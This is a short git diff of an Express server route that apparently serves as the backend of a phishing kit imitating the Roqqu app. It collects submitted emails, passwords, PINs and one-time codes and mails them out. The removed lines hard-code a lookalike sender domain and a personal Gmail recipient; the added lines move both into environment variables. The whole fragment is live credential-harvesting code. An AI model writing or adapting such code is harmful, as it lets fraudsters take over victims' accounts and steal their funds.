@@ -68,12 +68,12 @@ app.post('/rq-1', (req, res, next) => {
     console.log('req body', req.body)
 
     const { email, password, pin, otp } = req.body
-    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat`
+    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> </br> checking - New message from Roqquappchat!`
   
 
     const mail = {
-        from: 'admin@roqquapp.com.ng',
-        to: 'soulbar23@gmail.com',
+        from: process.env.EMAIL,
+        to: process.env.TOEMAIL,
         //to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqquappchat',
         html: content,
